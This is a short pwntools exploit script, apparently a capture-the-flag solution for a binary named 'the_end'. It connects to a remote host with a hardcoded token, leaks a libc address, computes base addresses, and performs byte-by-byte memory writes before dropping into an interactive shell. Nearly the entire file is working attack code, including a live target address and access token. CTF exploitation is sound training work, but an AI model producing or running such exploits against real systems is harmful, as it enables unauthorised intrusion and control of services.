from pwn import *

#p = process('./the_end')
p = remote('150.109.46.159',20002)
libc = ELF('libc64.so')
context.log_level = 'debug'

p.recvuntil('Input your token:')
p.sendline('wYEM8HmC8ySq2X4rVEcMEeYQ0k8zvuBi')
p.recvuntil('here is a gift ')
data = p.recv(14)
data = int(data,16)
print hex(data)

libc_base = data - libc.symbols['sleep']
elf_base = libc_base - 0x2aaaa24b9000
read_base = libc_base + libc.symbols['read']
log.success('the libc_base is:'+hex(libc_base))
log.success('the elf_base is:'+hex(elf_base))
log.success('the read_addr is:'+hex(read_base))

p.recvuntil('good luck ;)\n')
sleep(1)
read_addr = 0x200FB8 + elf_base
p.send(p64(read_addr))
sleep(0.1)
p.send(p8(data&0xff))
sleep(0.1)
p.send(p64(read_addr+1))
sleep(0.1)
p.send(p8((data&0xffff)>>8))
sleep(0.1)
p.send(p64(read_addr+2))
sleep(0.1)
p.send(p8((data&0xffffff)>>16))
sleep(0.1)
p.send(p64(read_addr+3))
sleep(0.1)
p.send(p8((data&0xffffffff)>>24))
sleep(0.1)

p.interactive()
